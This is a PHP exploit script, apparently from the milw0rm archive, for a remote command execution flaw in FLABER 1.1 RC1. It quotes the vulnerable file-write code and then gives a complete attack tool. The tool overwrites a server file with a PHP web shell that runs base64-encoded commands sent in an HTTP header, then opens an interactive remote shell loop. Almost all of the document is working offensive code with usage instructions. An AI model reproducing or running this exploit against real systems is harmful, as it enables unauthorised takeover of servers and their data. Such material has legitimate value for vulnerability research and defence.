<html><head><title>FLABER <= 1.1 RC1 Remote Command Execution Exploit</title></head><pre>&lt;?php

/*
	--------------------------------------------------
	FLABER &lt;= 1.1 RC1 Remote Command Execution Exploit
	--------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://sourceforge.net/projects/flaber

	[-] vulnerable code in /function/update_xml.php
	
	12.		$target_file = $_GET [&quot;target_file&quot;];
	13.		
	14.		// if the target is well defined, update now...
	15.		if ($target_file == &quot;&quot;)
	16.		{
	17.			echo (&quot;&lt;critical&gt;&quot; . $FILE_NAME . &quot; Incorrect parameter target_file.&lt;/critical&gt;&quot;);
	18.			exit;
	19.		}
	20.		
	21.		
	22.		$target_file = &quot;../&quot; . $target_file;
	23.		
	24.		// if it is a file
	25.		if (is_file ($target_file))
	26.		{
	27.			if (!is_writable ($target_file))
	28.			{
	29.				echo (&quot;&lt;critical&gt;&quot; . $FILE_NAME . &quot; &quot; . $target_file . &quot; is not writable.&lt;/critical&gt;&quot;);
	30.				exit;
	31.			}		
	32.	
	33.			$fp = fopen($target_file, &quot;w&quot;);
	34.			
	35.			$raw_xml = file_get_contents(&quot;php://input&quot;);
	36.			fwrite($fp, $raw_xml);
	37.			
	38.			fclose ($fp);
	39.			echo (&quot;&lt;normal&gt;&quot; . $FILE_NAME . &quot; &quot; . $target_file . &quot; updated successfully.&lt;/normal&gt;&quot;);
	40.			exit;
	41.		}
	
	an attacker could be overwrite an existing file with arbitrary data by $_POST array (lines 33-36)

*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from &quot;.$host.&quot;:80 Trying again...&quot;;
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

print &quot;\n+------------------------------------------------------------+&quot;;
print &quot;\n| FLABER &lt;= 1.1 RC1 Remote Command Execution Exploit by EgiX |&quot;;
print &quot;\n+------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage:		php $argv[0] host path\n&quot;;
	print &quot;\nhost:		target server (ip/hostname)&quot;;
	print &quot;\npath:		path to FLABER directory (example: / or /flaber/\n&quot;;
	die();
}

$host	= $argv[1];
$path	= $argv[2];

$payload = &quot;&lt;?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?&gt;&quot;;
$packet  = &quot;POST {$path}function/update_xml.php?target_file=function/upload_file.php HTTP/1.0\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;
$packet .= $payload;

if (!preg_match(&quot;/updated successfully/&quot;, http_send($host, $packet))) die(&quot;\n\n[-] Exploit failed...\n&quot;);

define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));

while(1)
{
	print &quot;\nxpl0it-sh3ll &gt; &quot;;
	$cmd = trim(fgets(STDIN));
	if ($cmd != &quot;exit&quot;)
	{
		$packet  = &quot;GET {$path}function/upload_file.php HTTP/1.0\r\n&quot;;
		$packet .= &quot;Host: {$host}\r\n&quot;;
		$packet .= &quot;Cmd: &quot;.base64_encode($cmd).&quot;\r\n&quot;;
		$packet .= &quot;Connection: close\r\n\r\n&quot;;
		$html = http_send($host, $packet);
		if (!ereg(&quot;_code_&quot;, $html)) die(&quot;\n[-] Exploit failed...\n&quot;);
		$shell = explode(&quot;_code_&quot;, $html);
		print &quot;\n&quot;.$shell[1];
	}
	else break;
}

?&gt;

# milw0rm.com [2008-04-08]</pre></html>